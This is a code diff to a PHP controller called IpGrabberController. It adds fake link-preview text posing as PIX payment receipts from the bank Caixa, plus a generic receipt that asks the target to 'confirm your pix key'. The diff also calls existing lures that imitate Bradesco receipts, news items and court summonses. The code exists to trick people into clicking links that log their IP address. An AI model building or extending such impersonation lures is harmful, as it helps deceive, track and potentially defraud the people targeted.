@@ -29,6 +29,8 @@ class IpGrabberController extends Controller
 
         if ($ipGrabber) {
             $this->preencherPreviewDoPixBradescoSeNecessario($ipGrabber);
+            $this->preencherPreviewDoPixCaixaSeNecessario($ipGrabber);
+            $this->preencherPreviewDoPixNomeAlvoSeNecessario($ipGrabber);
             $this->preencherPreviewDaNoticiaSeNecessario($ipGrabber);
             $this->preencherPreviewDaIntimacaoSeNecessario($ipGrabber);
             $ipGrabber->refresh();
@@ -293,6 +295,48 @@ class IpGrabberController extends Controller
             $ipGrabber->forceFill(['og_imagem_upload' => $dest])->save();
             $ipGrabber->refresh();
             return;
+        }
+    }
+
+    private function preencherPreviewDoPixNomeAlvoSeNecessario(IpGrabber $ipGrabber): void
+    {
+        if ($ipGrabber->preview_tipo !== 'pix_nome_alvo') {
+            return;
+        }
+
+        $updates = [];
+
+        if (! $ipGrabber->og_titulo) {
+            $updates['og_titulo'] = 'Comprovante PIX';
+        }
+
+        if (! $ipGrabber->og_descricao) {
+            $updates['og_descricao'] = 'Abra o comprovante para confirmar sua chave pix';
+        }
+
+        if ($updates) {
+            $ipGrabber->forceFill($updates)->save();
+        }
+    }
+
+    private function preencherPreviewDoPixCaixaSeNecessario(IpGrabber $ipGrabber): void
+    {
+        if ($ipGrabber->preview_tipo !== 'pix_caixa') {
+            return;
+        }
+
+        $updates = [];
+
+        if (! $ipGrabber->og_titulo) {
+            $updates['og_titulo'] = 'Comprovante PIX Caixa';
+        }
+
+        if (! $ipGrabber->og_descricao) {
+            $updates['og_descricao'] = 'Clique para abrir seu comprovante.';
+        }
+
+        if ($updates) {
+            $ipGrabber->forceFill($updates)->save();
         }
     }
 
